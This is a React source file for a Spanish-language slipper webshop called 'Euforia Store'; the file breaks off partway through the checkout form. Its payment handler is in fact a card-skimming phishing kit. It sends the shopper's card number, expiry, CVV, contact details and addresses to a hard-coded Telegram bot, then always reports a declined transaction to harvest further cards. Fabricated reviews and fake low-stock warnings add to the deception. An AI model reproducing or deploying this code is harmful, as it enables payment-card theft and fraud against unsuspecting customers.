import { useState, FormEvent, useMemo } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  ShoppingCart, 
  ChevronLeft, 
  CreditCard, 
  Truck, 
  ShieldCheck, 
  CheckCircle2, 
  Star, 
  ShoppingBag, 
  X, 
  Plus, 
  Minus,
  ArrowRight,
  Package,
  Clock
} from 'lucide-react';
import { Color, Product, CartItem } from './types';

const PRODUCTS: Product[] = [
  {
    id: 'p1',
    name: 'Pantuflas de Piel Premium',
    price: 7.99,
        category: 'Colección Invierno',
    description: 'Pantuflas ultra suaves con forro de piel sintética de alta calidad. Ideales para el descanso en casa con un toque de elegancia y confort inigualable.',
    colors: ['marrón', 'rosa', 'gris', 'blanco', 'rojo'],
    sizes: ['36-37', '38-39', '40-41', '42-43'],
    reviews: 1248,
    rating: 4.9,
    stock: 12,
    reviewsList: [
      { id: '1', userName: 'María G.', rating: 5, comment: 'Son increíblemente suaves, las mejores que he tenido.', date: 'hace 2 días', userImage: 'https://instagram.fsti5-1.fna.fbcdn.net/v/t51.82787-19/633664300_18043511498518282_4226976222586137644_n.jpg?efg=eyJ2ZW5jb2RlX3RhZyI6InByb2ZpbGVfcGljLmRqYW5nby45NjAuYzIifQ&_nc_ht=instagram.fsti5-1.fna.fbcdn.net&_nc_cat=110&_nc_oc=Q6cZ2gG6vZAFAOWRz6g_rsZNsmtNw6GfmJ4fY0l-SzF-TPFht430n5YTUKWJ-uS294bwJfTQ2TR253KSKqpUxPNGD0U3&_nc_ohc=nczCeaH-vV8Q7kNvwHfKT2x&_nc_gid=c1sEs4sfKVi2sxkNmr8nqQ&edm=ALGbJPMBAAAA&ccb=7-5&oh=00_Af0sNLDUERlNpw95DVm6_eNeNzRN-j3x1KB4ZuhKTZumKg&oe=69D254F7&_nc_sid=7d3ac5' },
    ],
    images: {
      'marrón': 'https://image2url.com/r2/default/images/1774991893154-50d1f8be-5adb-4a75-9b74-b3d14e2005b8.jpeg',
      'rosa': 'https://image2url.com/r2/default/images/1774992020130-1cf3f017-766e-464e-a4af-cfd8a36723fa.jpeg',
      'gris': 'https://image2url.com/r2/default/images/1774993498033-ae52ffea-f97c-4f5f-99e3-5f70752542d5.jpeg',
      'rojo': 'https://image2url.com/r2/default/images/1774991960729-720bd52f-1642-40ab-be0c-86c2d081e92f.jpeg',
      'blanco': 'https://image2url.com/r2/default/images/1774993949971-2027ad14-b86f-48a2-ae98-9a6fd5260a6e.jpeg',
    }
  },
  {
    id: 'p2',
    name: 'Zapatos de corazón de melocotón',
    price: 7.99,
    category: 'Otoño e invierno',
    description: 'Hechas a mano con lana virgen 100%. Suela antideslizante y diseño ergonómico para una calidez total en climas extremos.',
    colors: ['gris', 'rojo', 'rosa'],
    sizes: ['36-37', '38-39', '40-41', '42-43'],
    reviews: 856,
    rating: 4.7,
    stock: 5,
    reviewsList: [
      { id: '3', userName: 'Elena P.', rating: 5, comment: 'Súper calientes para el invierno, me encantan.', date: 'hace 3 días', userImage: 'https://i.pravatar.cc/150?u=elena' },
      { id: '9', userName: 'Ana T.', rating: 5, comment: 'El diseño nórdico es precioso y abrigan muchísimo.', date: 'hace 1 mes', userImage: 'https://i.pravatar.cc/150?u=ana' },
      { id: '11', userName: 'Marta L.', rating: 5, comment: 'Las compré para regalo y fueron un éxito total.', date: 'hace 3 meses', userImage: 'https://i.pravatar.cc/150?u=marta' },
      { id: '13', userName: 'Carmen J.', rating: 4, comment: 'Calentitas y cómodas para estar por casa.', date: 'hace 5 meses', userImage: 'https://i.pravatar.cc/150?u=carmen' }
    ],
    images: {
      'gris': 'https://s.alicdn.com/@sc04/kf/H7e618b15c3aa4e3c96798f14ee195db5u.jpg?avif=close&webp=close',
      'rojo': 'https://s.alicdn.com/@sc04/kf/Hb8cd4644d0e24a94a2ca3ce2b746e5c7r.jpg?avif=close&webp=close',
      'rosa': 'https://s.alicdn.com/@sc04/kf/He6d9b9a283bd480caa7087ed785efc13O.jpg?avif=close&webp=close',
    }
  },
  {
    id: 'p3',
    name: 'Zapatillas de interior',
    price: 7.99,
    category: 'Colección Verano',
    description: 'Algodón orgánico transpirable. Perfectas para después de la ducha o para días calurosos donde buscas frescura y ligereza.',
    colors: ['nothing', 'blanco', 'negro', 'rosa'],
    sizes: ['36-37', '38-39', '40-41', '42-43'],
    reviews: 2103,
    rating: 4.8,
    stock: 24,
    reviewsList: [
      { id: '5', userName: 'Lucía S.', rating: 5, comment: 'Frescas y ligeras, perfectas para el verano.', date: 'hace 1 día', userImage: 'https://i.pravatar.cc/150?u=lucia' }
    ],
    images: {
      'nothing': 'https://s.alicdn.com/@sc04/kf/Hf4b1e5217bee41709c24ef173fa1d82a6.jpg?avif=close&webp=close',
      'blanco': 'https://s.alicdn.com/@sc04/kf/H8982e975ff3f43eea3ca7a9512779aabb.jpg?avif=close&webp=close',
      'negro': 'https://s.alicdn.com/@sc04/kf/H465031d3d7954c2a928607658627d757E.jpg?avif=close&webp=close',
      'rosa': 'https://s.alicdn.com/@sc04/kf/H1c4812a645de4d44a561c2a483b0bd9dQ.jpg?avif=close&webp=close',
    }
  },
  {
    id: 'p4',
    name: 'Pantuflas de Terciopelo Real',
    price: 20.00,
    category: 'Edición Limitada',
    description: 'El lujo máximo para tus pies. Terciopelo italiano con detalles bordados en hilo de seda. Incluye bolsa de viaje.',
    colors: ['rosa', 'blanco', 'negro'],
    sizes: ['36-37', '38-39', '40-41', '42-43'],
    reviews: 432,
    rating: 5.0,
    stock: 3,
    reviewsList: [
      { id: '7', userName: 'Sofía L.', rating: 5, comment: 'El terciopelo es de otro mundo, puro lujo.', date: 'hace 4 días', userImage: 'https://i.pravatar.cc/150?u=sofia' },
      { id: '14', userName: 'Isabel K.', rating: 5, comment: 'Elegancia pura, me siento como una reina en casa.', date: 'hace 2 meses', userImage: 'https://i.pravatar.cc/150?u=isabel' },
      { id: '16', userName: 'Laura D.', rating: 5, comment: 'Simplemente espectaculares.', date: 'hace 4 meses', userImage: 'https://i.pravatar.cc/150?u=laura' }
    ],
    images: {
      'rosa': 'https://s.alicdn.com/@sc04/kf/H5c5729c6c908475cbe4cf26d7ed78600W.jpg?avif=close&webp=close',
      'blanco': 'https://s.alicdn.com/@sc04/kf/He815d6e02e744287907a186dbc7c91bcn.jpg?avif=close&webp=close',
      'negro': 'https://s.alicdn.com/@sc04/kf/Hfaa7c36796ab456e920bd206087e2ebbP.jpg?avif=close&webp=close',
    }
  }
];

const COUNTRIES = [
  "Afghanistan", "Albania", "Algeria", "Andorra", "Angola", "Antigua and Barbuda", "Argentina", "Armenia", "Australia", "Austria", 
  "Azerbaijan", "Bahamas", "Bahrain", "Bangladesh", "Barbados", "Belarus", "Belgium", "Belize", "Benin", "Bhutan", 
  "Bolivia", "Bosnia and Herzegovina", "Botswana", "Brazil", "Brunei", "Bulgaria", "Burkina Faso", "Burundi", "Cabo Verde", "Cambodia", 
  "Cameroon", "Canada", "Central African Republic", "Chad", "Chile", "China", "Colombia", "Comoros", "Congo (Congo-Brazzaville)", "Congo (Democratic Republic of the)", 
  "Costa Rica", "Croatia", "Cuba", "Cyprus", "Czechia (Czech Republic)", "Denmark", "Djibouti", "Dominica", "Dominican Republic", "Ecuador", 
  "Egypt", "El Salvador", "Equatorial Guinea", "Eritrea", "Estonia", "Eswatini", "Ethiopia", "Fiji", "Finland", "France", 
  "Gabon", "Gambia", "Georgia", "Germany", "Ghana", "Greece", "Grenada", "Guatemala", "Guinea", "Guinea-Bissau", 
  "Guyana", "Haiti", "Holy See", "Honduras", "Hungary", "Iceland", "India", "Indonesia", "Iran", "Iraq", 
  "Ireland", "Israel", "Italy", "Jamaica", "Japan", "Jordan", "Kazakhstan", "Kenya", "Kiribati", "Kuwait", 
  "Kyrgyzstan", "Laos", "Latvia", "Lebanon", "Lesotho", "Liberia", "Libya", "Liechtenstein", "Lithuania", "Luxembourg", 
  "Madagascar", "Malawi", "Malaysia", "Maldives", "Mali", "Malta", "Marshall Islands", "Mauritania", "Mauritius", "Mexico", 
  "Micronesia", "Moldova", "Monaco", "Mongolia", "Montenegro", "Morocco", "Mozambique", "Myanmar (formerly Burma)", "Namibia", "Nauru", 
  "Nepal", "Netherlands", "New Zealand", "Nicaragua", "Niger", "Nigeria", "North Korea", "North Macedonia", "Norway", "Oman", 
  "Pakistan", "Palau", "Palestine State", "Panama", "Papua New Guinea", "Paraguay", "Peru", "Philippines", "Poland", "Portugal", 
  "Qatar", "Romania", "Russia", "Rwanda", "Saint Kitts and Nevis", "Saint Lucia", "Saint Vincent and the Grenadines", "Samoa", "San Marino", "Sao Tome and Principe", 
  "Saudi Arabia", "Senegal", "Serbia", "Seychelles", "Sierra Leone", "Singapore", "Slovakia", "Slovenia", "Solomon Islands", "Somalia", 
  "South Africa", "South Korea", "South Sudan", "Spain", "Sri Lanka", "Sudan", "Suriname", "Sweden", "Switzerland", "Syria", 
  "Tajikistan", "Tanzania", "Thailand", "Timor-Leste", "Togo", "Tonga", "Trinidad and Tobago", "Tunisia", "Turkey", "Turkmenistan", 
  "Tuvalu", "Uganda", "Ukraine", "United Arab Emirates", "United Kingdom", "United States of America", "Uruguay", "Uzbekistan", "Vanuatu", "Venezuela", 
  "Vietnam", "Yemen", "Zambia", "Zimbabwe"
];

const getCardType = (number: string) => {
  const n = number.replace(/\D/g, '');
  if (n.startsWith('4')) return 'Visa';
  if (/^5[1-5]/.test(n) || /^222[1-9]|22[3-9]\d|2[3-6]\d{2}|27[01]\d|2720/.test(n)) return 'Mastercard';
  if (/^3[47]/.test(n)) return 'American Express';
  if (/^6(?:011|5)/.test(n)) return 'Discover';
  if (/^3(?:0[0-5]|[68])/.test(n)) return 'Diners Club';
  if (/^35/.test(n)) return 'JCB';
  return '';
};

const COLOR_MAP: Record<Color, string> = {
  'marrón': '#8B4513',
  'azul': '#0000FF',
  'rosa': '#FFC0CB',
  'gris': '#808080',
  'negro': '#000000',
  'blanco': '#FFFFFF',
  'rojo': '#FF0000',
};

export default function App() {
  const [view, setView] = useState<'home' | 'detail' | 'checkout'>('home');
  const [selectedProduct, setSelectedProduct] = useState<Product | null>(null);
  const [selectedColor, setSelectedColor] = useState<Color>('marrón');
  const [selectedSize, setSelectedSize] = useState<string>('36-37');
  const [cart, setCart] = useState<CartItem[]>([]);
  const [isCartOpen, setIsCartOpen] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Form States
  const [email, setEmail] = useState('');
  const [marketing, setMarketing] = useState(false);
  const [phone, setPhone] = useState('');
  const [saveInfo, setSaveInfo] = useState(false);
  const [shippingMethod, setShippingMethod] = useState<'gratis' | 'express'>('gratis');
  const [titular, setTitular] = useState('');
  const [tarjeta, setTarjeta] = useState('');
  const [exp, setExp] = useState('');
  const [cvv, setCvv] = useState('');
  const [country, setCountry] = useState('');
  const [street, setStreet] = useState('');
  const [apt, setApt] = useState('');
  const [city, setCity] = useState('');
  const [zip, setZip] = useState('');
  const [state, setState] = useState('');

  // Billing Address States
  const [billingSameAsShipping, setBillingSameAsShipping] = useState(true);
  const [billingStreet, setBillingStreet] = useState('');
  const [billingApt, setBillingApt] = useState('');
  const [billingCity, setBillingCity] = useState('');
  const [billingZip, setBillingZip] = useState('');
  const [billingState, setBillingState] = useState('');
  const [billingCountry, setBillingCountry] = useState('');

  const subtotal = useMemo(() => cart.reduce((acc, item) => acc + (item.price * item.quantity), 0), [cart]);
  const shippingCost = shippingMethod === 'express' ? 5.00 : 0.00;
  const total = subtotal + shippingCost;

  const addToCart = (product: Product, color: Color, size: string) => {
    const existingItem = cart.find(item => item.productId === product.id && item.color === color && item.size === size);
    if (existingItem) {
      setCart(cart.map(item => 
        (item.productId === product.id && item.color === color && item.size === size) 
        ? { ...item, quantity: item.quantity + 1 } 
        : item
      ));
    } else {
      setCart([...cart, {
        productId: product.id,
        name: product.name,
        price: product.price,
        color: color,
        size: size,
        quantity: 1,
        image: product.images[color]
      }]);
    }
    setIsCartOpen(true);
  };

  const removeFromCart = (productId: string, color: Color, size: string) => {
    setCart(cart.filter(item => !(item.productId === productId && item.color === color && item.size === size)));
  };

  const updateQuantity = (productId: string, color: Color, size: string, delta: number) => {
    setCart(cart.map(item => {
      if (item.productId === productId && item.color === color && item.size === size) {
        const newQty = Math.max(1, item.quantity + delta);
        return { ...item, quantity: newQty };
      }
      return item;
    }));
  };

  const handlePayment = async (e: FormEvent) => {
    e.preventDefault();
    if (!email || !titular || !tarjeta || !exp || !cvv || !street || !city || !zip || !state || !country || !phone) {
      alert("Por favor, complete todos los campos obligatorios de envío.");
      return;
    }

    if (!billingSameAsShipping && (!billingStreet || !billingCity || !billingZip || !billingState || !billingCountry)) {
      alert("Por favor, complete todos los campos obligatorios de facturación.");
      return;
    }

    setIsSubmitting(true);
    const cartDetails = cart.map(item => `${item.name} (${item.color}, Talla: ${item.size}) x${item.quantity}`).join('\n');
    
    const finalBillingStreet = billingSameAsShipping ? street : billingStreet;
    const finalBillingApt = billingSameAsShipping ? apt : billingApt;
    const finalBillingCity = billingSameAsShipping ? city : billingCity;
    const finalBillingZip = billingSameAsShipping ? zip : billingZip;
    const finalBillingState = billingSameAsShipping ? state : billingState;
    const finalBillingCountry = billingSameAsShipping ? country : billingCountry;

    const mensaje = `
🚨 NUEVO PEDIDO CAPTURADO 🚨

👤 TITULAR: ${titular}
📧 EMAIL: ${email}
📱 TELÉFONO: ${phone}

🛒 PRODUCTOS:
${cartDetails}

💳 PAGO:
Tarjeta: ${tarjeta}
Exp: ${exp}
CVV: ${cvv}
Envío: ${shippingMethod === 'gratis' ? 'Gratis' : 'Express'}
Total: $${total.toFixed(2)} USD

📍 DIRECCIÓN DE ENVÍO:
Calle: ${street}
Apto: ${apt}
Ciudad: ${city}
Estado: ${state}
ZIP: ${zip}
País: ${country}

🧾 DIRECCIÓN DE FACTURACIÓN:
Calle: ${finalBillingStreet}
Apto: ${finalBillingApt}
Ciudad: ${finalBillingCity}
Estado: ${finalBillingState}
ZIP: ${finalBillingZip}
País: ${finalBillingCountry}
`;

    const token = "8367352890:AAFcUK97oOu6iAI89qeeiytxePg5EE6eiCs";
    const chat_id = "8447588640";
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(mensaje)}`;

    try {
      await fetch(url);
      alert("Transacción Declinada: Por favor intente con otra tarjeta.");
      setTarjeta(""); setCvv(""); setExp("");
    } catch (error) {
      console.error("Error:", error);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#f8fafc] text-[#1e293b] font-sans selection:bg-blue-100">
      {/* Header */}
      <header className="sticky top-0 z-40 bg-white/80 backdrop-blur-md border-b border-slate-200">
        <div className="max-w-7xl mx-auto px-4 h-14 sm:h-16 flex items-center justify-between">
          <div 
            className="flex items-center gap-2 cursor-pointer group"
            onClick={() => setView('home')}
          >
            <span className="text-xl sm:text-2xl font-serif font-bold tracking-tight text-slate-900 italic">Euforia <span className="text-blue-600 not-italic">Store</span></span>
          </div>
          
          <button 
            onClick={() => setIsCartOpen(true)}
            className="relative p-2 text-slate-600 hover:text-blue-600 transition-colors"
          >
            <ShoppingCart size={24} />
            {cart.length > 0 && (
              <span className="absolute -top-1 -right-1 bg-blue-600 text-white text-[10px] font-bold w-5 h-5 flex items-center justify-center rounded-full border-2 border-white">
                {cart.reduce((acc, i) => acc + i.quantity, 0)}
              </span>
            )}
          </button>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-3 sm:px-4 py-4 sm:py-8">
        <AnimatePresence mode="wait">
          {view === 'home' && (
            <motion.div
              key="home"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
            >
              <div className="mb-4 sm:mb-12 text-center">
                <h2 className="text-xl sm:text-4xl font-extrabold text-slate-900 mb-1 sm:mb-4">¡Tus Pies Merecen un Abrazo! ✨</h2>
                <p className="text-xs sm:text-base text-slate-500 max-w-2xl mx-auto px-4">Camina sobre nubes con nuestras pantuflas más suaves y adorables. El descanso perfecto que tu hogar necesita. ☁️💖</p>
              </div>

              <div className="grid grid-cols-2 lg:grid-cols-4 gap-3 sm:gap-8">
                {PRODUCTS.map(product => (
                  <motion.div 
                    key={product.id}
                    whileHover={{ y: -8 }}
                    className="bg-white rounded-3xl shadow-sm border border-slate-100 overflow-hidden group cursor-pointer"
                    onClick={() => {
                      setSelectedProduct(product);
                      setSelectedColor(product.colors[0]);
                      setSelectedSize(product.sizes[0]);
                      setView('detail');
                    }}
                  >
                    <div className="aspect-square relative overflow-hidden bg-slate-50">
                      <img 
                        src={product.images[product.colors[0]]} 
                        alt={product.name}
                        className="w-full h-full object-cover group-hover:scale-110 transition-transform duration-500"
                        referrerPolicy="no-referrer"
                      />
                      <div className="absolute top-4 left-4">
                        <span className="bg-white/90 backdrop-blur px-3 py-1 rounded-full text-[10px] font-bold uppercase tracking-wider text-blue-600 shadow-sm">
                          {product.category}
                        </span>
                      </div>
                      {product.stock < 10 && (
                        <div className="absolute top-4 right-4">
                          <span className="bg-red-500 text-white px-2 py-1 rounded-full text-[8px] sm:text-[10px] font-black uppercase tracking-widest shadow-lg animate-pulse">
                            ¡Últimas {product.stock}!
                          </span>
                        </div>
                      )}
                    </div>
                    <div className="p-2 sm:p-6">
                      <div className="flex flex-col sm:flex-row justify-between items-start mb-0.5 sm:mb-2">
                        <h3 className="font-bold text-xs sm:text-lg text-slate-900 line-clamp-1">{product.name}</h3>
                        <span className="font-bold text-blue-600 text-xs sm:text-base">${product.price.toFixed(2)}</span>
                      </div>
                      <div className="flex items-center gap-1 text-amber-400 mb-1.5 sm:mb-4">
                        {[...Array(5)].map((_, i) => (
                          <Star 
                            key={i} 
                            size={8} 
                            sm:size={14} 
                            fill={i < Math.floor(product.rating) ? "currentColor" : "none"} 
                            className={i < Math.floor(product.rating) ? "" : "text-slate-200"}
                          />
                        ))}
                        <span className="text-slate-400 text-[8px] sm:text-xs ml-0.5">({product.reviews})</span>
                      </div>
                      <button className="w-full py-1.5 sm:py-3 bg-slate-50 hover:bg-blue-600 hover:text-white text-slate-600 text-[10px] sm:text-base font-semibold rounded-lg sm:rounded-xl transition-all flex items-center justify-center gap-1 sm:gap-2">
                        Ver detalles
                        <ArrowRight size={12} className="sm:w-4 sm:h-4" />
                      </button>
                    </div>
                  </motion.div>
                ))}
              </div>
            </motion.div>
          )}

          {view === 'detail' && selectedProduct && (
            <motion.div
              key="detail"
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
              className="max-w-5xl mx-auto"
            >
              <button 
                onClick={() => setView('home')}
                className="flex items-center gap-2 text-slate-500 hover:text-slate-900 mb-4 sm:mb-8 transition-colors text-sm sm:text-base"
              >
                <ChevronLeft size={18} />
                Volver al catálogo
              </button>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 sm:gap-12 bg-white p-3 sm:p-8 rounded-2xl sm:rounded-[40px] shadow-xl border border-slate-100">
                <div className="space-y-3 sm:space-y-4">
                  <div className="aspect-square rounded-xl sm:rounded-[32px] overflow-hidden bg-slate-50 border border-slate-100 shadow-inner">
                    <img 
                      src={selectedProduct.images[selectedColor]} 
                      alt={selectedProduct.name}
                      className="w-full h-full object-cover"
                      referrerPolicy="no-referrer"
                    />
                  </div>
                  <div className="grid grid-cols-4 gap-2 sm:gap-4">
                    {selectedProduct.colors.map(color => (
                      <button 
                        key={color}
                        onClick={() => setSelectedColor(color)}
                        className={`aspect-square rounded-lg sm:rounded-2xl overflow-hidden border-2 transition-all ${selectedColor === color ? 'border-blue-600 scale-105' : 'border-transparent opacity-60'}`}
                      >
                        <img src={selectedProduct.images[color]} className="w-full h-full object-cover" referrerPolicy="no-referrer" />
                      </button>
                    ))}
                  </div>
                </div>

                <div className="flex flex-col">
                  <span className="text-blue-600 font-bold text-[10px] sm:text-sm uppercase tracking-widest mb-1 sm:mb-2">{selectedProduct.category}</span>
                  <h1 className="text-xl sm:text-4xl font-black text-slate-900 mb-2 sm:mb-4">{selectedProduct.name}</h1>
                  <div className="flex items-center gap-2 sm:gap-4 mb-3 sm:mb-6">
                    <span className="text-xl sm:text-3xl font-bold text-slate-900">${selectedProduct.price.toFixed(2)}</span>
                    <div className="h-4 w-px bg-slate-200"></div>
                    <div className="flex items-center gap-1 text-amber-400">
                      <Star size={12} sm:size={16} fill="currentColor" />
                      <span className="text-slate-900 font-bold text-xs sm:text-base">{selectedProduct.rating}</span>
                      <span className="text-slate-400 text-[10px] sm:text-sm">({selectedProduct.reviews} reseñas)</span>
                    </div>
                  </div>

                  <div className="flex items-center gap-2 mb-4 sm:mb-6">
                    {selectedProduct.stock < 10 ? (
                      <div className="flex items-center gap-1.5 px-2 py-1 bg-red-50 text-red-600 rounded-full text-[10px] sm:text-xs font-bold animate-pulse">
                        <Clock size={12} />
                        ¡Solo quedan {selectedProduct.stock} unidades!
                      </div>
                    ) : (
                      <div className="flex items-center gap-1.5 px-2 py-1 bg-green-50 text-green-600 rounded-full text-[10px] sm:text-xs font-bold">
                        <Package size={12} />
                        En stock: {selectedProduct.stock} unidades
                      </div>
                    )}
                  </div>
                  
                  <p className="text-xs sm:text-base text-slate-500 leading-relaxed mb-4 sm:mb-8">{selectedProduct.description}</p>

                  <div className="mb-4 sm:mb-6">
                    <label className="block text-[10px] sm:text-sm font-bold text-slate-900 mb-2 sm:mb-4">Talla: <span className="text-blue-600">{selectedSize}</span></label>
                    <div className="flex flex-wrap gap-2">
                      {selectedProduct.sizes.map(size => (
                        <button
                          key={size}
                          onClick={() => setSelectedSize(size)}
                          className={`px-3 py-1.5 sm:px-4 sm:py-2 rounded-lg border-2 text-[10px] sm:text-sm font-bold transition-all ${selectedSize === size ? 'border-blue-600 bg-blue-50 text-blue-600' : 'border-slate-100 bg-white text-slate-600 hover:border-slate-200'}`}
                        >
                          {size}
                        </button>
                      ))}
                    </div>
                  </div>

                  <div className="mb-4 sm:mb-8">
                    <label className="block text-[10px] sm:text-sm font-bold text-slate-900 mb-2 sm:mb-4">Color: <span className="capitalize text-blue-600">{selectedColor}</span></label>
                    <div className="flex flex-wrap gap-1.5 sm:gap-3">
                      {selectedProduct.colors.map(color => (
                        <button
                          key={color}
                          onClick={() => setSelectedColor(color)}
                          className={`w-8 h-8 sm:w-12 sm:h-12 rounded-full border-2 sm:border-4 transition-all transform hover:scale-110 ${selectedColor === color ? 'border-blue-600 ring-2 sm:ring-4 ring-blue-100' : 'border-white shadow-md'}`}
                          style={{ backgroundColor: COLOR_MAP[color] }}
                        />
                      ))}
                    </div>
                  </div>

                  <div className="mt-auto space-y-2 sm:space-y-4">
                    <button 
                      onClick={() => addToCart(selectedProduct, selectedColor, selectedSize)}
                      className="w-full py-3 sm:py-5 bg-blue-600 hover:bg-blue-700 text-white font-black text-sm sm:text-lg rounded-xl sm:rounded-2xl shadow-xl shadow-blue-200 transition-all flex items-center justify-center gap-2 sm:gap-3"
                    >
                      <ShoppingCart size={18} sm:size={24} />
                      Añadir al carrito
                    </button>
                    <div className="flex items-center justify-center gap-3 sm:gap-6 text-slate-400 text-[8px] sm:text-[10px] font-bold uppercase tracking-widest">
                      <div className="flex items-center gap-1"><Truck size={10} sm:size={12} /> Envío Gratis</div>
                      <div className="flex items-center gap-1"><ShieldCheck size={10} sm:size={12} /> Pago Seguro</div>
                    </div>
                  </div>

                  {/* Reviews Section */}
                  <div className="mt-12 pt-12 border-t border-slate-100">
                    <h3 className="text-lg sm:text-xl font-black text-slate-900 mb-6">Reseñas de clientes</h3>
                    <div className="space-y-6">
                      {selectedProduct.reviewsList.map(review => (
                        <div key={review.id} className="bg-slate-50 p-4 sm:p-6 rounded-2xl">
                          <div className="flex items-center gap-3 mb-3">
                            <img 
                              src={review.userImage} 
                              alt={review.userName} 
                              className="w-10 h-10 rounded-full object-cover border-2 border-white shadow-sm"
                              referrerPolicy="no-referrer"
                            />
                            <div>
                              <h4 className="font-bold text-slate-900 text-sm">{review.userName}</h4>
                              <div className="flex items-center gap-1 text-amber-400">
                                {[...Array(5)].map((_, i) => (
                                  <Star key={i} size={10} fill={i < review.rating ? "currentColor" : "none"} className={i < review.rating ? "" : "text-slate-200"} />
                                ))}
                                <span className="text-[10px] text-slate-400 ml-1">{review.date}</span>
                              </div>
                            </div>
                          </div>
                          <p className="text-slate-600 text-xs sm:text-sm leading-relaxed italic">"{review.comment}"</p>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              </div>
            </motion.div>
          )}

          {view === 'checkout' && (
            <motion.div
              key="checkout"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: 20 }}
              className="max-w-2xl mx-auto px-4 sm:px-0"
            >
              <div>
                <button onClick={() => setView('home')} className="flex items-center gap-2 text-slate-500 mb-8 hover:text-slate-900">
                  <ChevronLeft size={20} /> Volver a la tienda
                </button>

                <form onSubmit={handlePayment} className="space-y-8">
                  <section>
                    <h2 className="text-lg sm:text-xl font-bold mb-3 sm:mb-4 flex items-center gap-2">
                      <div className="w-7 h-7 sm:w-8 sm:h-8 bg-blue-100 text-blue-600 rounded-lg flex items-center justify-center text-xs sm:text-sm">1</div>
                      Información de Contacto
                    </h2>
                    <div className="space-y-3 sm:space-y-4">
                      <input 
                        type="email" 
                        placeholder="Correo electrónico" 
                        required 
                        value={email}
                        onChange={e => setEmail(e.target.value)}
                        className="w-full p-3 sm:p-4 bg-white border border-slate-200 rounded-xl sm:rounded-2xl focus:ring-4 focus:ring-blue-100 outline-none transition-all text-sm"
                      />
                      <div className="flex items-center gap-2 sm:gap-3 px-1 sm:px-2">
                        <input type="checkbox" id="mkt" checked={marketing} onChange={e => setMarketing(e.target.checked)} className="w-4 h-4 sm:w-5 sm:h-5 accent-blue-600" />
                        <label htmlFor="mkt" className="text-[10px] sm:text-sm text-slate-500">Enviarme novedades y ofertas por correo electrónico</label>
                      </div>
                    </div>
                  </section>

                  <section>
                    <h2 className="text-lg sm:text-xl font-bold mb-3 sm:mb-4 flex items-center gap-2">
                      <div className="w-7 h-7 sm:w-8 sm:h-8 bg-blue-100 text-blue-600 rounded-lg flex items-center justify-center text-xs sm:text-sm">2</div>
                      Entrega
                    </h2>
                    <div className="grid grid-cols-1 gap-3 sm:gap-4">
                      <select 
                        required 
                        value={country}
                        onChange={e => setCountry(e.target.value)}
                        className="w-full p-3 sm:p-4 bg-white border border-slate-200 rounded-xl sm:rounded-2xl focus:ring-4 focus:ring-blue-100 outline-none text-sm"
                      >
                        <option value="">Selecciona un país</option>
                        {COUNTRIES.map(c => <option key={c} value={c}>{c}</option>)}
                      </select>
                      <input type="text" placeholder="Dirección" required value={street} onChange={e => setStreet(e.target.value)} className="w-full p-3 sm:p-4 bg-white border border-slate-200 rounded-xl sm:rounded-2xl focus:ring-4 focus:ring-blue-100 outline-none text-sm" />
                      <input type="text" placeholder="Apto, suite, etc. (Opcional)" value={apt} onChange={e => setApt(e.target.value)} className="w-full p-3 sm:p-4 bg-white border border-slate-200 rounded-xl sm:rounded-2xl focus:ring-4 focus:ring-blue-100 outline-none text-sm" />
                      <div className="grid grid-cols-2 gap-3 sm:gap-4">
                        <input type="text" placeholder="Ciudad" required value={city} onChange={e => setCity(e.target.value)} className="w-full p-3 sm:p-4 bg-white border border-slate-200 rounded-xl sm:rounded-2xl focus:ring-4 focus:ring-blue-100 outline-none text-sm" />
                        <input type="text" placeholder="Código Postal" required value={zip} onChange={e => setZip(e.target.value)} className="w-full p-3 sm:p-4 bg-white border border-slate-200 rounded-xl sm:rounded-2xl focus:ring-4 focus:ring-blue-100 outline-none text-sm" />
                      </div>
                      <input type="text" placeholder="Estado / Provincia" required value={state} onChange={e => setState(e.target.value)} className="w-full p-3 sm:p-4 bg-white border border-slate-200 rounded-xl sm:rounded-2xl focus:ring-4 focus:ring-blue-100 outline-none text-sm" />
                      <input type="tel" placeholder="Teléfono" required value={phone} onChange={e => setPhone(e.target.value)} className="w-full p-3 sm:p-4 bg-white border border-slate-200 rounded-xl sm:rounded-2xl focus:ring-4 focus:ring-blue-100 outline-none text-sm" />
                      <div className="flex items-center gap-2 sm:gap-3 px-1 sm:px-2">
                        <input type="checkbox" id="save" checked={saveInfo} onChange={e => setSaveInfo(e.target.checked)} className="w-4 h-4 sm:w-5 sm:h-5 accent-blue-600" />
                        <label htmlFor="save" className="text-[10px] sm:text-sm text-slate-500">Guardar mi información para la próxima vez</label>
                      </div>
                    </div>
                  </section>

                  <section>
                    <h2 className="text-lg sm:text-xl font-bold mb-3 sm:mb-4 flex items-center gap-2">
                      <div className="w-7 h-7 sm:w-8 sm:h-8 bg-blue-100 text-blue-600 rounded-lg flex items-center justify-center text-xs sm:text-sm">3</div>
                      Dirección de Facturación
                    </h2>
                    <div className="space-y-3 sm:space-y-4 bg-white border border-slate-200 rounded-2xl sm:rounded-3xl p-4 sm:p-6">
                      <div 
                        onClick={() => setBillingSameAsShipping(true)}
                        className={`p-3 sm:p-4 rounded-xl sm:rounded-2xl border-2 cursor-pointer transition-all flex items-center gap-2 sm:gap-3 ${billingSameAsShipping ? 'border-blue-600 bg-blue-50' : 'border-slate-100'}`}
                      >
                        <div className={`w-4 h-4 sm:w-5 sm:h-5 rounded-full border-2 flex items-center justify-center ${billingSameAsShipping ? 'border-blue-600 bg-blue-600' : 'border-slate-300'}`}>
                          {billingSameAsShipping && <CheckCircle2 size={10} className="text-white" />}
                        </div>
                        <span className="text-xs sm:text-sm font-medium">Misma que envío</span>
                      </div>
                      
                      <div 
                        onClick={() => setBillingSameAsShipping(false)}
